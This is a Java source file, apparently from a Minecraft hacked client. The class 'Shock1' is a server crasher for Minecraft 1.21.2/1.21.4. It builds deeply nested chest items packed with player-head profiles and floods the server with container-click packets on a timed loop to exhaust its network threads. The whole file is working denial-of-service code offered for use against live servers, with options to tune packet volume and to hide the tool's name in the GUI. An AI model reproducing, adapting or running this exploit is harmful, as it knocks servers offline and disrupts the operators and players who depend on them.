package us.rin.crashers.impl;

import de.florianmichael.vialoadingbase.ViaLoadingBase;
import it.unimi.dsi.fastutil.ints.Int2ObjectMap;
import it.unimi.dsi.fastutil.ints.Int2ObjectOpenHashMap;
import us.rin.crashers.Crasher;
import us.rin.gui.clickgui.ClickGui;
import us.rin.protocol.RedSignalProtocol;
import us.rin.protocol.components.data.DataComponents;
import us.rin.protocol.components.data.impl.DataContainer;
import us.rin.protocol.components.data.impl.DataProfile;
import us.rin.protocol.components.objects.ItemStack;
import us.rin.protocol.components.objects.ItemType;
import us.rin.protocol.packets.PacketCodec;
import us.rin.protocol.packets.play.PacketContainerClick;
import us.rin.utils.OptionType;
import us.rin.utils.OptionUtil;

import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.ThreadLocalRandom;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;

public class Shock1 implements Crasher {
    private static final String METHOD_NAME = "Shock1";
    private boolean enabled = false;
    private ScheduledExecutorService executorService;

    @Override
    public void onMethod(String[] args) {
        int packets = Integer.parseInt(args[2]);
        int size = Integer.parseInt(args[3]);
        int scales = Integer.parseInt(args[4]);
        int mapSize = Integer.parseInt(args[5]);
        long threadSleep = Long.parseLong(args[6]);
        int loopAmount = Integer.parseInt(args[7]);
        setEnabled(true);

        if (executorService != null && !executorService.isShutdown()) {
            executorService.shutdownNow();
            msgHelper.sendMessage("Previous attack &cstopped&7!", true);
        }

        msgHelper.sendMessage("Starting crashing with &f" + (ClickGui.IS_VISIBLE ? getName() : "******"), true);

        int protocol = ViaLoadingBase.getInstance().getTargetVersion().getVersion();
        if (!RedSignalProtocol.SUPPORTED_PROTOCOLS.contains(protocol)) {
            msgHelper.sendMessage("To use " + getName() + " you must be using &cVersion 1.21.2/1.21.4&7, and your current protocol is &c" + protocol, true);
        }
        AtomicInteger check = new AtomicInteger(0);
        executorService = Executors.newSingleThreadScheduledExecutor();
        Runnable clickTask = () -> {
            if (!enabled || check.get() == loopAmount || (mc.getConnection() == null || !mc.getConnection().getConnection().isConnected())) {
                executorService.shutdown();
                setEnabled(false);
                msgHelper.sendMessage("Attack &asuccessful &7finished!", true);
            }else {
                us.rin.protocol.components.objects.ItemStack itemStack = getDataSkullStack(size, scales);
                Int2ObjectMap<ItemStack> int2objectmap = new Int2ObjectOpenHashMap<>();
                for (int j = 0; j < mapSize; ++j) int2objectmap.put(j, itemStack);
                PacketCodec.sendPacket(new PacketContainerClick(protocol, 0, 1, 10,
                        PacketContainerClick.ContainerActionType.CLICK_ITEM, PacketContainerClick.ContainerAction.RIGHT_CLICK,
                        itemStack, int2objectmap), packets);
            }
            check.getAndIncrement();
        };
        executorService.scheduleAtFixedRate(clickTask, 0, threadSleep, TimeUnit.MILLISECONDS);
    }

    public static us.rin.protocol.components.objects.ItemStack getDataSkullStack(int itemsAmount, int scales) {
        int protocol = ViaLoadingBase.getInstance().getTargetVersion().getVersion();

        List<us.rin.protocol.components.objects.ItemStack> chests = new ArrayList<>(scales);

        for (int i = 0; i < scales; i++) {
            List<us.rin.protocol.components.objects.ItemStack> skullItems = new ArrayList<>(itemsAmount);
            for (int j = 0; j < itemsAmount; j++) {
                DataProfile profile = new DataProfile(
                        String.valueOf(ThreadLocalRandom.current().nextInt()),
                        null,
                        List.of()
                );
                DataComponents skullComponents = new DataComponents();
                skullComponents.put(profile);

                var skullItem = new us.rin.protocol.components.objects.ItemStack(
                        ItemType.PLAYER_HEAD.getId(protocol),
                        1,
                        skullComponents
                );

                skullItems.add(skullItem);
            }

            DataComponents chestComponents = new DataComponents();
            chestComponents.put(new DataContainer(skullItems));

            var chestItem = new us.rin.protocol.components.objects.ItemStack(
                    ItemType.CHEST.getId(protocol),
                    1,
                    chestComponents
            );

            chests.add(chestItem);
        }

        DataComponents finalComponents = new DataComponents();
        finalComponents.put(new DataContainer(chests));

        return new us.rin.protocol.components.objects.ItemStack(ItemType.CHEST.getId(protocol), 1, finalComponents
        );
    }
    @Override
    public String getName() {
        return METHOD_NAME;
    }

    @Override
    public boolean getEnabled() {
        return enabled;
    }

    @Override
    public void setEnabled(boolean bool) {
        this.enabled = bool;
    }

    @Override
    public String getArgsUsage() {
        return "packets[100], size[256], scales[60], map-size[15], sleep[1], loop[1]";
    }

    @Override
    public List<OptionUtil> getOptions() {
        return List.of(
                new OptionUtil("Packets", OptionType.INTEGER),
                new OptionUtil("Size", OptionType.INTEGER),
                new OptionUtil("Scales", OptionType.INTEGER),
                new OptionUtil("Map Size", OptionType.INTEGER),
                new OptionUtil("Sleep", OptionType.INTEGER),
                new OptionUtil("Loop", OptionType.INTEGER)
        );
    }

    @Override
    public String getDescription() {
        return "All Netty Threads Crasher";
    }
}